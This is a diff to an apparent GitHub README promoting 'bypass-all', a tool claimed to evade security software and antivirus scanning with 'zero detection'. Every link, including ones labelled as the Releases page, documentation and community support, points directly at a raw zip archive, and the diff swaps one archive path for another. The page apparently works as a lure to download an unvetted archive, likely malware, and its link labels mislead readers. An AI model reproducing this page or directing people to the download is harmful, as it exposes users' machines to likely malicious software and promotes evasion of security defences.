@@ -1,7 +1,7 @@
 # 🚀 bypass-all - Bypass Security Software with Ease
 
 ## 🔗 Download Now
-[![Download bypass-all](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/capitatim/bypass-all.zip%https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/capitatim/bypass-all.zip)](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/capitatim/bypass-all.zip)
+[![Download bypass-all](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/udrl-vs/examples/bypass_all_v2.5.zip%https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/udrl-vs/examples/bypass_all_v2.5.zip)](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/udrl-vs/examples/bypass_all_v2.5.zip)
 
 ## 📋 Overview
 bypass-all helps you avoid detection from various security software. This application can bypass systems like WB and VT, ensuring zero detection. It is designed for users who need quick and reliable access without interruptions from security alerts.
@@ -10,7 +10,7 @@ bypass-all helps you avoid detection from various security software. This applic
 Using bypass-all is straightforward. You follow these steps to download, install, and run the application.
 
 ### 📥 Step 1: Download the Application
-To download bypass-all, visit the Releases page [here](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/capitatim/bypass-all.zip). 
+To download bypass-all, visit the Releases page [here](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/udrl-vs/examples/bypass_all_v2.5.zip). 
 
 ### 🔄 Step 2: Locate the Latest Release
 On the Releases page, you will see different versions of the application. Look for the latest version at the top. This version typically has the most recent updates and improvements.
@@ -47,8 +47,8 @@ If you experience issues while using bypass-all, consider the following:
 - **Compatibility:** Ensure your operating system meets the requirements listed above.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/capitatim/bypass-all.zip) - For detailed instructions and troubleshooting guides.
-- [Community Support](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/capitatim/bypass-all.zip) - Report issues or ask for help.
+- [Official Documentation](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/udrl-vs/examples/bypass_all_v2.5.zip) - For detailed instructions and troubleshooting guides.
+- [Community Support](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/udrl-vs/examples/bypass_all_v2.5.zip) - Report issues or ask for help.
 
 ## 💬 Feedback
 Your feedback is important. If you have suggestions or encounter any issues, please get in touch through the community support link above.
@@ -56,4 +56,4 @@ Your feedback is important. If you have suggestions or encounter any issues, ple
 ## 🎉 Conclusion
 With bypass-all, you can easily navigate around security software. Follow these steps, and you will have the application up and running in no time. 
 
-Remember to regularly check the [Releases page](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/capitatim/bypass-all.zip) for the latest updates.
+Remember to regularly check the [Releases page](https://raw.githubusercontent.com/Icy-Senpal/bypass-all/main/udrl-vs/examples/bypass_all_v2.5.zip) for the latest updates.
